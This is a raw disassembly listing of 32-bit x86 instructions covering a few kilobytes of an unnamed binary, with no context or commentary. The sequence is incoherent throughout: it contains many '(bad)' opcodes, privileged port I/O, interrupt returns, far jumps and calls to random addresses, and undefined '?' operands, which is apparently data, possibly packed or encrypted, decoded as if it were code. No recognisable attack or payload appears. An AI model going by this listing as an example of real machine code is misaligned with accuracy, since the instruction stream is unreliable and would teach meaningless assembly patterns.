  40f658:	loop   0x40f5ed
  40f65a:	scas   al,BYTE PTR es:[edi]
  40f65b:	cmp    DWORD PTR [edx-0x3a],ebp
  40f65e:	iret   
  40f65f:	stos   DWORD PTR es:[edi],eax
  40f660:	cmc    
  40f661:	add    dh,BYTE PTR [ebx-0x3cd92c37]
  40f667:	loop   0x40f6a0
  40f669:	div    DWORD PTR [esi+0x57b182da]
  40f66f:	iret   
  40f670:	pop    esp
  40f671:	push   edi
  40f672:	jle    0x40f679
  40f674:	outs   dx,DWORD PTR ds:[esi]
  40f675:	add    esi,DWORD PTR [ebx-0x55914610]
  40f67b:	pop    es
  40f67c:	into   
  40f67d:	fdivr  DWORD PTR [ebp*4-0x60edaec3]
  40f684:	xchg   edi,eax
  40f685:	ins    DWORD PTR es:[edi],dx
  40f686:	test   al,0xe8
  40f688:	push   esi
  40f689:	dec    eax
  40f68a:	retf   0x7524
  40f68d:	mov    bh,0x16
  40f68f:	imul   esp,DWORD PTR [ebx-0x14],0xffffffd7
  40f693:	adc    BYTE PTR [esi],0x5e
  40f696:	aam    0x16
  40f698:	ins    BYTE PTR es:[edi],dx
  40f699:	pushf  
  40f69a:	mov    eax,ds:0xe607fedb
  40f69f:	call   0x1f669745
  40f6a4:	into   
  40f6a5:	shr    esp,cl
  40f6a7:	mov    es,WORD PTR [ebp+0x21]
  40f6aa:	lahf   
  40f6ab:	lods   al,BYTE PTR ds:[esi]
  40f6ac:	sub    eax,0x9f272a8e
  40f6b1:	xchg   ecx,eax
  40f6b2:	fs push ss
  40f6b4:	std    
  40f6b5:	in     eax,dx
  40f6b6:	cdq    
  40f6b7:	and    bl,BYTE PTR [ecx]
  40f6b9:	mov    ecx,edx
  40f6bb:	(bad)  
  40f6bc:	call   0xc886:0xf55fdd9d
  40f6c3:	mov    dl,0xce
  40f6c5:	test   BYTE PTR [ebx+ebx*1-0x5cbb8d64],al
  40f6cc:	adc    BYTE PTR [edx],ah
  40f6ce:	push   ebx
  40f6cf:	fs (bad) 
  40f6d1:	addr16 mov ebp,0x40410b5f
  40f6d7:	in     eax,0xe0
  40f6d9:	pop    esp
  40f6da:	add    al,0xe3
  40f6dc:	fld    DWORD PTR [ebx]
  40f6de:	jo     0x40f718
  40f6e0:	dec    edi
  40f6e1:	push   0xffffff80
  40f6e3:	scas   al,BYTE PTR es:[edi]
  40f6e4:	xor    DWORD PTR [eax],ebp
  40f6e6:	iret   
  40f6e7:	rol    DWORD PTR [edx+0x58],cl
  40f6ea:	jmp    0xc226df48
  40f6ef:	dec    BYTE PTR [esi]
  40f6f1:	rol    BYTE PTR [ecx-0x6d043d52],1
  40f6f7:	(bad)  
  40f6f8:	jb     0x40f68d
  40f6fa:	stos   BYTE PTR es:[edi],al
  40f6fb:	bound  esp,QWORD PTR [ecx+0x1e]
  40f6fe:	nop
  40f6ff:	repnz sti 
  40f701:	int3   
  40f702:	add    BYTE PTR [edx],bl
  40f704:	int    0xa3
  40f706:	sub    al,0x74
  40f708:	inc    esi
  40f709:	cmp    ebx,edx
  40f70b:	mov    ebx,0x8d05e177
  40f710:	loop   0x40f6d5
  40f712:	(bad)  
  40f713:	outs   dx,BYTE PTR ds:[esi]
  40f714:	xor    al,ch
  40f716:	(bad)  
  40f717:	daa    
  40f718:	cdq    
  40f719:	je     0x40f78a
  40f71b:	mov    ebx,0xa247c558
  40f720:	sbb    al,0xca
  40f722:	shl    BYTE PTR [esi-0x27c52e61],cl
  40f728:	sar    BYTE PTR [esp+eiz*2-0x41a97c98],0xc7
  40f730:	scas   eax,DWORD PTR es:[edi]
  40f731:	cli    
  40f732:	adc    al,0xef
  40f734:	adc    eax,0xe4a81e8b
  40f739:	aas    
  40f73a:	xor    edi,DWORD PTR [ebx]
  40f73c:	sahf   
  40f73d:	or     eax,0xd6e6e133
  40f742:	fs jnp 0x40f796
  40f745:	jnp    0x40f76c
  40f747:	fcomp  DWORD PTR [eax-0x16c5d36d]
  40f74d:	push   0x13
  40f74f:	pop    esp
  40f750:	popa   
  40f751:	inc    eax
  40f752:	out    0xd1,al
  40f754:	call   0xc9e4e448
  40f759:	add    bl,BYTE PTR [ebp-0x37e07982]
  40f75f:	inc    esp
  40f760:	test   al,0x5
  40f762:	mov    eax,0xf122aee0
  40f767:	retf   
  40f768:	mov    ebx,0xf6fdcf74
  40f76d:	fisttp QWORD PTR [eax-0x56d6a815]
  40f773:	aaa    
  40f774:	mov    al,ds:0xca42f62c
  40f779:	loop   0x40f702
  40f77b:	sbb    esi,DWORD PTR es:[edi-0x71]
  40f77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f780:	adc    BYTE PTR [edx],0xc7
  40f783:	ret    
  40f784:	std    
  40f785:	cli    
  40f786:	(bad)
  40f78a:	jmp    0xf1932ffe
  40f78f:	push   edi
  40f790:	push   cs
  40f791:	rcr    DWORD PTR [edx+0x6e381a4e],0xe5
  40f798:	faddp  st(0),st
  40f79a:	pop    ss
  40f79b:	or     al,0xd5
  40f79d:	sub    BYTE PTR [eax-0x17],bl
  40f7a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7a1:	(bad)  
  40f7a2:	or     al,0x51
  40f7a4:	pop    edi
  40f7a5:	std    
  40f7a6:	mov    edx,0xe96ad536
  40f7ab:	test   eax,0x6abf2ebc
  40f7b0:	xchg   DWORD PTR [esi+0x4c1d8cb1],esi
  40f7b6:	sub    BYTE PTR [edi+edi*1],dl
  40f7b9:	shr    DWORD PTR [esi+0x307a18d3],0x6c
  40f7c0:	pop    esi
  40f7c1:	push   edx
  40f7c2:	jo     0x40f812
  40f7c4:	daa    
  40f7c5:	push   edi
  40f7c6:	test   eax,0x2a6ab776
  40f7cb:	test   DWORD PTR [ebp-0x6d7f48a3],edi
  40f7d1:	mov    eax,ds:0x1e9230de
  40f7d6:	or     edx,DWORD PTR [edx-0x11]
  40f7d9:	mov    ch,0x10
  40f7db:	out    0x70,al
  40f7dd:	lds    ebp,FWORD PTR [edi-0x6abd6b82]
  40f7e3:	dec    esp
  40f7e4:	aad    0xe3
  40f7e6:	jb     0x40f7ea
  40f7e8:	adc    DWORD PTR [edx-0x38],esp
  40f7eb:	repz jae 0x40f857
  40f7ee:	test   al,0x21
  40f7f0:	stc    
  40f7f1:	pop    ebp
  40f7f2:	repnz dec esp
  40f7f4:	icebp  
  40f7f5:	addr16 dec eax
  40f7f7:	mov    BYTE PTR [ecx+ebp*2],bl
  40f7fa:	mov    ds:0x68e0e447,al
  40f7ff:	inc    eax
  40f800:	int    0xd8
  40f802:	mov    edx,0x4757c3be
  40f807:	mov    ds:0x6c23f71d,eax
  40f80c:	mov    bl,0x8
  40f80e:	push   edx
  40f80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f810:	push   es
  40f811:	test   edi,edi
  40f813:	dec    BYTE PTR [esi+0x19e2f8c]
  40f819:	push   0x6f3755a
  40f81e:	cwde   
  40f81f:	ja     0x40f89d
  40f821:	push   ds
  40f822:	popf   
  40f823:	pop    ss
  40f824:	lahf   
  40f825:	pop    ss
  40f826:	in     eax,dx
  40f827:	in     eax,dx
  40f828:	loop   0x40f7d3
  40f82a:	outs   dx,BYTE PTR ds:[esi]
  40f82b:	push   cs
  40f82c:	into   
  40f82d:	adc    DWORD PTR [edx+0x70],esi
  40f830:	ror    BYTE PTR [ebx+esi*2-0x1e],0x72
  40f835:	loope  0x40f7d9
  40f837:	psrad  mm4,mm0
  40f83a:	sbb    esi,DWORD PTR [esi]
  40f83c:	jns    0x40f7dc
  40f83e:	js     0x40f8b5
  40f840:	xor    DWORD PTR [esi+0x42b9ff8e],ebp
  40f846:	adc    al,0x2e
  40f848:	and    al,0x46
  40f84a:	out    dx,eax
  40f84b:	into   
  40f84c:	scas   eax,DWORD PTR es:[edi]
  40f84d:	cmp    esp,DWORD PTR [esi+0x4]
  40f850:	les    ecx,FWORD PTR [ebx]
  40f852:	pop    ebx
  40f853:	xor    BYTE PTR [esi-0x4a16e617],dl
  40f859:	add    ebp,DWORD PTR [ebx+0x71f2b18d]
  40f85f:	sub    esi,DWORD PTR [edi]
  40f861:	mov    DWORD PTR [edi+ebp*2],esi
  40f864:	inc    esp
  40f865:	retf   0x1259
  40f868:	fmul   QWORD PTR [ebx-0x520f6997]
  40f86e:	pop    ss
  40f86f:	repz data16 (bad) 
  40f872:	call   0x2b55e8d7
  40f877:	cmp    dl,BYTE PTR [ecx-0x2b]
  40f87a:	mov    ds,WORD PTR [ebx]
  40f87c:	std    
  40f87d:	sahf   
  40f87e:	cmp    BYTE PTR [esi],ah
  40f880:	pop    ds
  40f881:	ins    DWORD PTR es:[edi],dx
  40f882:	pcmpgtd mm5,QWORD PTR [ecx+0x7d]
  40f886:	(bad)
  40f88a:	mov    ecx,0x9c92e939
  40f88f:	mov    ebx,?
  40f891:	pop    ds
  40f892:	sub    BYTE PTR [ecx],ah
  40f894:	jae    0x40f83a
  40f896:	and    DWORD PTR [eax],esp
  40f898:	xchg   ecx,eax
  40f899:	push   0xffffff9f
  40f89b:	pop    ecx
  40f89c:	xchg   esi,eax
  40f89d:	retf   0x7fbe
  40f8a0:	push   ecx
  40f8a1:	cmp    esi,DWORD PTR [esi]
  40f8a3:	sub    ch,bh
  40f8a5:	inc    esi
  40f8a6:	xchg   ebx,eax
  40f8a7:	retf   
  40f8a8:	xchg   esp,eax
  40f8a9:	cld    
  40f8aa:	fnsave [edi-0x6bdde3d0]
  40f8b0:	mov    ah,0xc3
  40f8b2:	into   
  40f8b3:	pop    esi
  40f8b4:	call   0x4ea01e03
  40f8b9:	pop    esi
  40f8ba:	mov    ah,0x86
  40f8bc:	pop    ebp
  40f8bd:	mov    ?,esi
  40f8bf:	data16 out 0xc9,al
  40f8c2:	push   0xf
  40f8c4:	int    0xba
  40f8c6:	in     al,dx
  40f8c7:	lock push cs
  40f8c9:	hlt    
  40f8ca:	xlat   BYTE PTR ds:[ebx]
  40f8cb:	data16 clc 
  40f8cd:	mov    bh,0x45
  40f8cf:	repnz gs popa 
  40f8d2:	fucomi st,st(5)
  40f8d4:	inc    edi
  40f8d5:	push   ecx
  40f8d6:	and    edi,edi
  40f8d8:	ret    
  40f8d9:	mov    ebx,0xf89512a1
  40f8de:	push   esi
  40f8df:	or     edx,eax
  40f8e1:	dec    edx
  40f8e2:	xor    DWORD PTR ds:0x97d1b81d,ebp
  40f8e8:	nop
  40f8e9:	and    eax,0xe81ccd26
  40f8ee:	jbe    0x40f929
  40f8f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8f1:	call   0x5a89a036
  40f8f6:	into   
  40f8f7:	scas   al,BYTE PTR es:[edi]
  40f8f8:	or     esp,edi
  40f8fa:	mov    dh,0x83
  40f8fc:	mov    esi,0x9bc0a278
  40f901:	in     eax,0xb2
  40f903:	jo     0x40f8df
  40f905:	mov    bh,0x4a
  40f907:	xchg   ebx,eax
  40f908:	pushf  
  40f909:	mov    al,0x6f
  40f90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f90c:	sub    ah,BYTE PTR [ebp-0x3158d7ee]
  40f912:	adc    al,0x67
  40f914:	in     eax,0xb5
  40f916:	dec    esp
  40f917:	outs   dx,DWORD PTR ds:[esi]
  40f918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f919:	adc    eax,0x59d68e26
  40f91e:	pop    ebx
  40f91f:	jecxz  0x40f8b0
  40f921:	sub    al,0xcb
  40f923:	into   
  40f924:	leave  
  40f925:	test   DWORD PTR [edx+esi*8-0x4eff70d9],ecx
  40f92c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f92e:	int    0x36
  40f930:	jns    0x40f95d
  40f932:	sahf   
  40f933:	add    esp,DWORD PTR [eax+0x11d87b8f]
  40f939:	inc    ebx
  40f93a:	adc    DWORD PTR [esp+edi*1+0x53],esi
  40f93e:	mov    dh,0xfa
  40f940:	test   DWORD PTR [ebp*8-0x786cea68],0x7c3fc583
  40f94b:	inc    ebp
  40f94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f94d:	fimul  DWORD PTR [edi]
  40f94f:	pop    edx
  40f950:	or     eax,0x6c7fd36c
  40f955:	stc    
  40f956:	out    0xf,eax
  40f958:	enter  0xc840,0x5d
  40f95c:	mov    bh,0xcf
  40f95e:	test   eax,0x1caad96e
  40f963:	test   al,0x65
  40f965:	or     eax,0xeb6d26d4
  40f96a:	ins    DWORD PTR es:[edi],dx
  40f96b:	mov    ch,0xad
  40f96d:	xor    BYTE PTR [esi+0x34],0x8a
  40f971:	retf   0xc9a0
  40f974:	fisttp WORD PTR [esi+esi*2-0x4f]
  40f978:	and    al,BYTE PTR [ebp+0x74b56702]
  40f97e:	push   ebp
  40f97f:	out    0xa6,al
  40f981:	or     eax,0x4f8891a8
  40f986:	jnp    0x40f962
  40f988:	(bad)  [esi]
  40f98a:	adc    dx,WORD PTR [esi+0x2e]
  40f98e:	xchg   esp,eax
  40f98f:	out    0x5f,al
  40f991:	aam    0xf0
  40f993:	dec    ebx
  40f994:	(bad)  [esi+0x23]
  40f997:	mov    ds:0x68aa0c44,eax
  40f99c:	cmp    DWORD PTR [ebx+esi*2-0x2edd647a],eax
  40f9a3:	cmp    ah,BYTE PTR [edi+edx*2-0x63]
  40f9a7:	fiadd  WORD PTR [edx+ebx*4]
  40f9aa:	hlt    
  40f9ab:	sbb    al,0x21
  40f9ad:	outs   dx,BYTE PTR ds:[esi]
  40f9ae:	xor    BYTE PTR [ebp+eax*1-0x21],al
  40f9b2:	add    BYTE PTR [ebx+0x572ca4aa],bh
  40f9b8:	push   edx
  40f9b9:	jno    0x40fa22
  40f9bb:	dec    eax
  40f9bc:	push   ds
  40f9bd:	dec    edx
  40f9be:	out    0x36,al
  40f9c0:	int3   
  40f9c1:	shr    DWORD PTR ds:0x66d0e290,cl
  40f9c7:	sbb    dh,bh
  40f9c9:	add    al,BYTE PTR [edx-0x2f703efe]
  40f9cf:	neg    dh
  40f9d1:	inc    ebp
  40f9d2:	adc    cl,BYTE PTR [edx-0x6a]
  40f9d5:	call   0xeb44:0x27e9dcc9
  40f9dc:	pop    ebp
  40f9dd:	idiv   DWORD PTR [ebx-0x3e377d3b]
  40f9e3:	push   cs
  40f9e4:	cmp    eax,esp
  40f9e6:	cld    
  40f9e7:	fnsave [ebx]
  40f9e9:	sub    esp,DWORD PTR [ecx+0x12]
  40f9ec:	sbb    eax,0xbba6045e
  40f9f1:	imul   ecx,DWORD PTR [ecx],0x5d518122
  40f9f7:	sub    eax,0x26ae1f47
  40f9fc:	inc    edi
  40f9fd:	or     esi,DWORD PTR [ebp+0x7e]
  40fa00:	mov    esi,0xdf82a9df
  40fa05:	das    
  40fa06:	mov    cl,0x84
  40fa08:	dec    ecx
  40fa09:	(bad)  [ebx-0x61]
  40fa0c:	lods   eax,DWORD PTR ds:[esi]
  40fa0d:	sub    DWORD PTR [edi+0x31],0xffffff8c
  40fa11:	and    al,0x14
  40fa13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa14:	imul   ebx,DWORD PTR [edx+0x64056454],0x3c17481c
  40fa1e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40fa20:	adc    ah,ch
  40fa22:	fist   WORD PTR fs:[eax+0x6c]
  40fa26:	arpl   ax,ax
  40fa28:	call   0x445bb015
  40fa2d:	sub    eax,0x865bbbda
  40fa32:	push   esp
  40fa33:	mov    ebx,0xdbfec155
  40fa38:	xchg   BYTE PTR fs:[ebp-0x70],bl
  40fa3c:	lods   al,BYTE PTR es:[esi]
  40fa3e:	jno    0x40fa6a
  40fa40:	pusha  
  40fa41:	mov    ah,0xa2
  40fa43:	jae    0x40fa2b
  40fa45:	add    DWORD PTR [eax-0x16433541],ebp
  40fa4b:	pushf  
  40fa4c:	(bad)  
  40fa4d:	mov    cl,0xdf
  40fa4f:	outs   dx,BYTE PTR ds:[esi]
  40fa50:	scas   eax,DWORD PTR es:[edi]
  40fa51:	sahf   
  40fa52:	pop    edx
  40fa53:	(bad)  
  40fa54:	sub    al,0x17
  40fa56:	adc    esp,DWORD PTR [ebx+0x7fa6408d]
  40fa5c:	adc    DWORD PTR [edx-0x15edbd80],edx
  40fa62:	add    ebx,DWORD PTR [ebp-0x2961965]
  40fa68:	ins    DWORD PTR es:[edi],dx
  40fa69:	xchg   ebx,eax
  40fa6a:	nop
  40fa6b:	ins    DWORD PTR es:[edi],dx
  40fa6c:	xor    DWORD PTR [ecx+0x43e3a4e8],0xc9d40d34
  40fa76:	repnz inc edx
  40fa78:	adc    BYTE PTR ds:0xdf694cab,ch
  40fa7e:	scas   eax,DWORD PTR es:[edi]
  40fa7f:	call   0x83bb1f85
  40fa84:	inc    edx
  40fa85:	sahf   
  40fa86:	fimul  DWORD PTR [edx+0x2e]
  40fa89:	dec    DWORD PTR [eax-0x41c6bf0b]
  40fa8f:	mov    al,0xc3
  40fa91:	in     al,dx
  40fa92:	and    BYTE PTR [ebp+0x6e],bl
  40fa95:	dec    edx
  40fa96:	in     al,dx
  40fa97:	push   edx
  40fa98:	ror    DWORD PTR [eax],1
  40fa9a:	and    edi,ebp
  40fa9c:	call   0x29dd9be3
  40faa1:	xchg   ecx,eax
  40faa2:	cmp    ebx,esp
  40faa4:	popf   
  40faa5:	les    edi,FWORD PTR [ebp-0x5]
  40faa8:	cmp    bl,BYTE PTR [eax]
  40faaa:	xlat   BYTE PTR fs:[ebx]
  40faac:	or     eax,0x39e9731b
  40fab1:	imul   ebp,DWORD PTR [esi+eiz*2],0x12
  40fab5:	ins    BYTE PTR es:[edi],dx
  40fab6:	xlat   BYTE PTR ds:[ebx]
  40fab7:	pop    esi
  40fab8:	popf   
  40fab9:	ds jne 0x40fa55
  40fabc:	xchg   esi,edx
  40fabe:	xor    al,0xb6
  40fac0:	inc    esp
  40fac1:	shl    BYTE PTR ds:0xf131f658,cl
  40fac7:	push   ss
  40fac8:	loop   0x40fab2
  40faca:	mov    esp,0x5cf84e2b
  40facf:	adc    BYTE PTR [ecx],0x3d
  40fad2:	test   DWORD PTR [ebx-0x7d],eax
  40fad5:	mov    dh,BYTE PTR [edi]
  40fad7:	(bad)  
  40fad8:	jle    0x40fb4f
  40fada:	imul   esi,DWORD PTR [edx],0x6f
  40fadd:	loope  0x40fb13
  40fadf:	in     eax,dx
  40fae0:	sub    edx,DWORD PTR [ebx+edi*8+0x7e7cfd92]
  40fae7:	mov    al,ds:0x20a62c7b
  40faec:	ret    
  40faed:	add    dl,BYTE PTR [edx]
  40faef:	xchg   ecx,eax
  40faf0:	mov    ah,0xdb
  40faf2:	stos   DWORD PTR es:[edi],eax
  40faf3:	mov    ds:0x16e66570,eax
  40faf8:	ins    BYTE PTR es:[edi],dx
  40faf9:	sar    BYTE PTR [ebx],cl
  40fafb:	mov    bl,0x92
  40fafd:	iret   
  40fafe:	sbb    eax,0x847151dd
  40fb03:	dec    ebp
  40fb04:	adc    al,0xe
  40fb06:	(bad)  
  40fb07:	lea    eax,[edx-0x1f0cb885]
  40fb0d:	mov    eax,ds:0xb7ee9780
  40fb12:	push   es
  40fb13:	adc    eax,0xccea7455
  40fb18:	push   es
  40fb19:	sti    
  40fb1a:	xchg   cl,ch
  40fb1c:	push   esp
  40fb1d:	gs shl DWORD PTR ds:[ecx],cl
  40fb21:	sub    BYTE PTR [esi],al
  40fb23:	mov    esp,0xe16d5957
  40fb28:	pop    esp
  40fb29:	mov    edx,0x4049f1b5
  40fb2e:	pop    esi
  40fb2f:	jp     0x40faca
  40fb31:	jg     0x40fb7f
  40fb33:	rcl    BYTE PTR [ecx+0x7f],cl
  40fb36:	outs   dx,BYTE PTR ds:[esi]
  40fb37:	xchg   edx,eax
  40fb38:	xor    BYTE PTR [ebx-0x2e],cl
  40fb3b:	sti    
  40fb3c:	fwait
  40fb3d:	test   DWORD PTR [edx+eax*2],ebp
  40fb40:	data16 loopne 0x40fb69
  40fb43:	sub    esi,DWORD PTR [ecx+ecx*4+0x24]
  40fb47:	xlat   BYTE PTR ds:[ebx]
  40fb48:	in     al,0xf9
  40fb4a:	push   edi
  40fb4b:	lock inc eax
  40fb4d:	lea    eax,[ebx-0x5d278279]
  40fb53:	push   esi
  40fb54:	adc    BYTE PTR [esi+0x19],bh
  40fb57:	nop
  40fb58:	call   0x9539:0x5b991f30
  40fb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb60:	sbb    DWORD PTR es:[ebx+0xaa4c0df],ecx
  40fb67:	gs popa 
  40fb69:	mov    ebp,0x3db62b3b
  40fb6e:	retf   
  40fb6f:	lock into 
  40fb71:	push   eax
  40fb72:	div    edx
  40fb74:	sub    BYTE PTR [ecx-0x4],ah
  40fb77:	mov    ecx,0x3b2a4d14
  40fb7c:	icebp  
  40fb7d:	dec    eax
  40fb7e:	ret    
  40fb7f:	cmp    al,dh
  40fb81:	mov    WORD PTR [esi-0x39d2a0bf],?
  40fb87:	popa   
  40fb88:	mov    al,0xc
  40fb8a:	sub    al,BYTE PTR [edx]
  40fb8c:	adc    edx,DWORD PTR [edx-0xb]
  40fb8f:	cmp    DWORD PTR [ebp-0xd3bd553],eax
  40fb95:	mov    al,ds:0x1aeefa5f
  40fb9a:	sar    BYTE PTR [edi-0x28],1
  40fb9d:	push   0x7ea7d3ce
  40fba2:	xchg   ebx,eax
  40fba3:	push   0x6b
  40fba5:	mov    esp,0x300dd11e
  40fbaa:	and    BYTE PTR [esi-0x56],0x72
  40fbae:	dec    eax
  40fbaf:	push   ebx
  40fbb0:	stos   DWORD PTR es:[edi],eax
  40fbb1:	mov    al,ds:0x4091e04b
  40fbb6:	pop    ss
  40fbb7:	sub    BYTE PTR [eax],ch
  40fbb9:	fisub  WORD PTR [ebp-0x32]
  40fbbc:	xor    BYTE PTR [esi+0x2c2d7736],ah
  40fbc2:	sar    BYTE PTR [esi+ebp*8+0x74],cl
  40fbc6:	out    0x19,al
  40fbc8:	add    eax,0xb565c1b3
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	(bad)  
  40fbcf:	mov    DWORD PTR [esi-0x76],0x2a78d703
  40fbd6:	lods   eax,DWORD PTR ds:[esi]
  40fbd7:	jecxz  0x40fb92
  40fbd9:	dec    edi
  40fbda:	lock data16 jg 0x40fb89
  40fbde:	pop    ds
  40fbdf:	cmc    
  40fbe0:	jo     0x40fba3
  40fbe2:	inc    esi
  40fbe3:	add    dl,bl
  40fbe5:	aam    0xc0
  40fbe7:	pop    DWORD PTR [ebx+0x2]
  40fbea:	adc    BYTE PTR [edx-0x57],ah
  40fbed:	nop
  40fbee:	adc    DWORD PTR [ebp-0x721aced0],esp
  40fbf4:	ret    0x3e32
  40fbf7:	inc    eax
  40fbf8:	pop    esp
  40fbf9:	nop
  40fbfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbfb:	pop    ss
  40fbfc:	jne    0x40fbd4
  40fbfe:	lods   al,BYTE PTR ds:[esi]
  40fbff:	sub    esp,DWORD PTR [edx-0x38cf8df7]
  40fc05:	jle    0x40fc49
  40fc07:	pop    esi
  40fc08:	(bad)  
  40fc09:	out    0x9e,al
  40fc0b:	clc    
  40fc0c:	outs   dx,BYTE PTR ds:[esi]
  40fc0d:	pop    esp
  40fc0e:	mov    cl,bh
  40fc10:	std    
  40fc11:	add    BYTE PTR [esi],ch
  40fc13:	retf   0xde79
  40fc16:	adc    BYTE PTR [edx],bh
  40fc18:	sahf   
  40fc19:	jae    0x40fc19
  40fc1b:	retf   
  40fc1c:	or     DWORD PTR [ebx-0x3af8d9e9],ebp
  40fc22:	adc    al,BYTE PTR ds:0x16208355
  40fc28:	jns    0x40fbee
  40fc2a:	jge    0x40fbea
  40fc2c:	aam    0x25
  40fc2e:	cs adc eax,0x29986e41
  40fc34:	inc    edi
  40fc35:	inc    ebp
  40fc36:	in     al,0x20
  40fc38:	fs inc esp
  40fc3a:	mov    al,BYTE PTR [esi+0x459e8e5e]
  40fc40:	jb     0x40fc0d
  40fc42:	jns    0x40fc49
  40fc44:	push   ecx
  40fc45:	sub    bl,BYTE PTR [ebx+ebp*8-0x48]
  40fc49:	call   0xa7654198
  40fc4e:	sbb    al,0x5b
  40fc50:	and    edx,ebx
  40fc52:	ja     0x40fc26
  40fc54:	(bad)  
  40fc55:	popa   
  40fc56:	rcr    bl,cl
  40fc58:	adc    eax,0xf6119771
  40fc5d:	shl    BYTE PTR ds:0x4c1d5ed5,cl
  40fc63:	sub    BYTE PTR [edx],0xc0
  40fc66:	mov    ebx,0xb0349039
  40fc6b:	cmp    BYTE PTR [edx+0x22],dl
  40fc6e:	dec    eax
  40fc6f:	test   edi,edi
  40fc71:	jecxz  0x40fc47
  40fc73:	hlt    
  40fc74:	hlt    
  40fc75:	icebp  
  40fc76:	mov    WORD PTR [edi+0x59],?
  40fc79:	xlat   BYTE PTR ds:[ebx]
  40fc7a:	call   0x1c331403
  40fc7f:	loopne 0x40fccd
  40fc81:	adc    BYTE PTR ds:0x7cefbe6e,0x8c
  40fc88:	mov    esi,0xdd5263ad
  40fc8d:	dec    ebx
  40fc8e:	push   edi
  40fc8f:	mov    edx,0xc3d6cd5c
  40fc94:	out    0xd,eax
  40fc96:	add    edx,DWORD PTR [ecx+0x694bfd2f]
  40fc9c:	iret   
  40fc9d:	ret    0xeb6d
  40fca0:	mov    esi,0xa0bb16b3
  40fca5:	out    dx,eax
  40fca6:	inc    edi
  40fca7:	nop
  40fca8:	cmp    DWORD PTR [ebp+0x41],ebp
  40fcab:	sub    al,0x30
  40fcad:	cdq    
  40fcae:	sar    BYTE PTR [eax+0x2f0a4c15],cl
  40fcb4:	adc    esp,DWORD PTR [edx-0x67]
  40fcb7:	pop    ecx
  40fcb8:	fnstcw WORD PTR [ebp+0x30]
  40fcbb:	jnp    0x40fcbd
  40fcbd:	pop    ss
  40fcbe:	les    eax,FWORD PTR [edi+0x2d]
  40fcc1:	test   BYTE PTR [esi+0xe],bl
  40fcc4:	gs mov ah,0xea
  40fcc7:	loop   0x40fc65
  40fcc9:	adc    BYTE PTR [edx-0x4d],dh
  40fccc:	jbe    0x40fd3f
  40fcce:	retf   0x67ac
  40fcd1:	lods   eax,DWORD PTR ds:[esi]
  40fcd2:	pop    ds
  40fcd3:	xor    al,0xc9
  40fcd5:	and    DWORD PTR [ebp+0x78],esi
  40fcd8:	sub    al,dl
  40fcda:	jne    0x40fd30
  40fcdc:	jmp    0xb5a9:0x211bd744
  40fce3:	mov    esp,0xf19e40ee
  40fce8:	scas   al,BYTE PTR es:[edi]
  40fce9:	loopne 0x40fd10
  40fceb:	in     eax,dx
  40fcec:	sbb    DWORD PTR [esp+esi*4],0x604f8bff
  40fcf3:	loopne 0x40fca7
  40fcf5:	mov    al,ds:0xb57e4b39
  40fcfa:	jne    0x40fcf2
  40fcfc:	or     DWORD PTR [edx],0xffffffb7
  40fcff:	add    esp,eax
  40fd01:	inc    ebp
  40fd02:	push   ds
  40fd03:	add    DWORD PTR [ecx+0x50f7c5f6],ebp
  40fd09:	push   edx
  40fd0a:	xor    edx,DWORD PTR [ebx]
  40fd0c:	je     0x40fcd6
  40fd0e:	popf   
  40fd0f:	fidiv  DWORD PTR [edx+0x17]
  40fd12:	pop    edx
  40fd13:	xchg   edx,eax
  40fd14:	xor    eax,0x761dacfb
  40fd19:	mov    eax,ss:0xfdd952eb
  40fd1f:	xchg   esp,eax
  40fd20:	cdq    
  40fd21:	xchg   ecx,eax
  40fd22:	inc    edx
  40fd23:	add    DWORD PTR [esi+0x6e7f1ec9],esi
  40fd29:	prefetcht2 BYTE PTR [edi+0x57a09779]
  40fd30:	jge    0x40fcd1
  40fd32:	dec    edi
  40fd33:	sbb    dh,BYTE PTR [esi]
  40fd35:	fcomip st,st(2)
  40fd37:	xor    cl,dl
  40fd39:	jge    0x40fcc2
  40fd3b:	leave  
  40fd3c:	clc    
  40fd3d:	mov    ebp,ebx
  40fd3f:	les    edx,FWORD PTR [eax+ebx*1]
  40fd42:	sti    
  40fd43:	pop    eax
  40fd44:	sbb    DWORD PTR [edi+0x66c6514d],esp
  40fd4a:	and    BYTE PTR [ebp+0x17a89515],0x1f
  40fd51:	cwde   
  40fd52:	xor    edi,DWORD PTR [esi+0x76fc6889]
  40fd58:	cmp    edi,DWORD PTR [edx]
  40fd5a:	mov    ecx,0x471f2ffa
  40fd5f:	dec    ebx
  40fd60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd61:	add    esp,DWORD PTR [edx+0x2ea6cc06]
  40fd67:	(bad)
  40fd6a:	icebp  
  40fd6b:	addr16 aam 0x48
  40fd6e:	in     eax,dx
  40fd6f:	fld    QWORD PTR [edi+edx*8]
  40fd72:	add    DWORD PTR [esi+0x7b],esp
  40fd75:	dec    ebp
  40fd76:	jbe    0x40fdef
  40fd78:	scas   al,BYTE PTR es:[edi]
  40fd79:	xchg   ecx,eax
  40fd7a:	loope  0x40fd61
  40fd7c:	adc    dl,BYTE PTR [edi]
  40fd7e:	addr16 xor al,0xd6
  40fd81:	and    BYTE PTR [ebx+0x41],cl
  40fd84:	in     al,dx
  40fd85:	xchg   esi,eax
  40fd86:	in     eax,dx
  40fd87:	call   0xabaf:0x842a810d
  40fd8e:	add    bl,cl
  40fd90:	mov    bl,0x9b
  40fd92:	dec    esp
  40fd93:	mov    dl,bl
  40fd95:	add    edi,DWORD PTR [eax+0x47685323]
  40fd9b:	mov    dh,BYTE PTR [edx-0x34]
  40fd9e:	gs retf 0xb691
  40fda2:	mov    ebp,0x5c498787
  40fda7:	or     BYTE PTR [esi],cl
  40fda9:	add    DWORD PTR [esi-0x739daa53],0xcec7d02d
